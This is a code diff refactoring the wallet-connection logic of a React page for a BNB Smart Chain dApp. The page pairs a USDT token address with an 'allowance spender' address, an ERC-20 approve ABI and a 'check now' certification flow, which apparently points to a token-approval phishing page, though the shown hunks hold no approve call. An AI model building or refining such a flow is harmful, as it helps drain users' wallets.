@@ -3,22 +3,12 @@
 import { useEffect, useState } from "react";
 import { BrowserProvider, Contract, ethers } from "ethers";
 import { Award, CalendarDays, Check, CheckCircle2, Clock3, Copy, DollarSign, LockKeyhole, Menu, PlusCircle, Radio, ShieldCheck, Sun, UserRound } from "lucide-react";
-
-type Eip1193Provider = {
-  request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
-  on?: (event: string, listener: (...args: unknown[]) => void) => void;
-  removeListener?: (event: string, listener: (...args: unknown[]) => void) => void;
-};
-
-type Eip6963ProviderDetail = { info: { name: string; rdns: string }; provider: Eip1193Provider };
-
-declare global { interface Window { ethereum?: Eip1193Provider; } }
+import { useWallet } from "../hooks/useWallet";
 
 const token = process.env.NEXT_PUBLIC_USDT_ADDRESS ?? "";
 const spender = process.env.NEXT_PUBLIC_ALLOWANCE_SPENDER_ADDRESS ?? "";
 const chainId = process.env.NEXT_PUBLIC_CHAIN_ID ?? "56";
-const targetChainId = BigInt(chainId);
-const targetChainHex = `0x${targetChainId.toString(16)}`;
+const targetChainHex = `0x${BigInt(chainId).toString(16)}`;
 const api = process.env.NEXT_PUBLIC_API_URL ?? "http://localhost:4000";
 const erc20 = [
   "function approve(address spender,uint256 amount) returns (bool)",
@@ -39,13 +29,9 @@ export default function Home() {
   const [isCertified, setIsCertified] = useState(false);
   const [openFaq, setOpenFaq] = useState<number | null>(null);
   const [isChecking, setIsChecking] = useState(false);
-  const [walletProvider, setWalletProvider] = useState<Eip1193Provider>();
+  const { walletProvider, getProvider, connectWallet } = useWallet();
 
   useEffect(() => {
-    const announced = (event: Event) => {
-      const provider = (event as CustomEvent<Eip6963ProviderDetail>).detail?.provider;
-      if (provider && !walletProvider) setWalletProvider(provider);
-    };
     const handleAccountsChanged = (...args: unknown[]) => {
       const accounts = Array.isArray(args[0]) ? (args[0] as string[]) : [];
       if (!accounts.length) {
@@ -63,54 +49,19 @@ export default function Home() {
       }
     };
 
-    window.addEventListener("eip6963:announceProvider", announced);
-    window.dispatchEvent(new Event("eip6963:requestProvider"));
-
-    const provider = walletProvider ?? window.ethereum;
-    provider?.on?.("accountsChanged", handleAccountsChanged);
-    provider?.on?.("chainChanged", handleChainChanged);
-    provider?.request({ method: "eth_accounts" })
+    walletProvider?.on?.("accountsChanged", handleAccountsChanged);
+    walletProvider?.on?.("chainChanged", handleChainChanged);
+    walletProvider?.request({ method: "eth_accounts" })
       .then((accounts) => {
         if (Array.isArray(accounts) && accounts[0]) setWallet(ethers.getAddress(String(accounts[0])));
       })
-      .catch(() => undefined);
+      .catch((error) => console.error("Unable to read wallet accounts:", error));
 
     return () => {
-      window.removeEventListener("eip6963:announceProvider", announced);
-      provider?.removeListener?.("accountsChanged", handleAccountsChanged);
-      provider?.removeListener?.("chainChanged", handleChainChanged);
+      walletProvider?.removeListener?.("accountsChanged", handleAccountsChanged);
+      walletProvider?.removeListener?.("chainChanged", handleChainChanged);
     };
   }, [walletProvider]);
-
-  function getProvider() {
-    return walletProvider ?? window.ethereum;
-  }
-
-  async function switchToBnb(provider: Eip1193Provider) {
-    const currentChain = String(await provider.request({ method: "eth_chainId" })).toLowerCase();
-    if (currentChain === targetChainHex) return;
-
-    try {
-      await provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: targetChainHex }] });
-    } catch (error) {
-      if ((error as { code?: number }).code !== 4902) throw error;
-      const isTestnet = targetChainId === BigInt(97);
-      await provider.request({
-        method: "wallet_addEthereumChain",
-        params: [{
-          chainId: targetChainHex,
-          chainName: isTestnet ? "BNB Smart Chain Testnet" : "BNB Smart Chain",
-          nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-          rpcUrls: [isTestnet ? "https://data-seed-prebsc-1-s1.bnbchain.org:8545" : "https://bsc-dataseed.bnbchain.org"],
-          blockExplorerUrls: [isTestnet ? "https://testnet.bscscan.com" : "https://bscscan.com"]
-        }]
-      });
-    }
-
-    if (String(await provider.request({ method: "eth_chainId" })).toLowerCase() !== targetChainHex) {
-      throw new Error("Please switch to BNB Smart Chain to continue.");
-    }
-  }
 
   async function checkNow() {
     const provider = getProvider();
@@ -121,12 +72,11 @@ export default function Home() {
     setNotice("");
 
     try {
-      const accounts = (await provider.request({ method: "eth_accounts" })) as string[];
-      if (!accounts?.length) throw new Error("No wallet account is selected. Connect your wallet and try again.");
-      await switchToBnb(provider);
+      const connectedAddress = await connectWallet();
+      if (!connectedAddress) throw new Error("Please switch to BNB Smart Chain to continue.");
 
       const browserProvider = new BrowserProvider(provider as never);
-      const address = ethers.getAddress(accounts[0]);
+      const address = ethers.getAddress(connectedAddress);
       setWallet(address);
 
       const contract = new Contract(token, erc20, browserProvider);
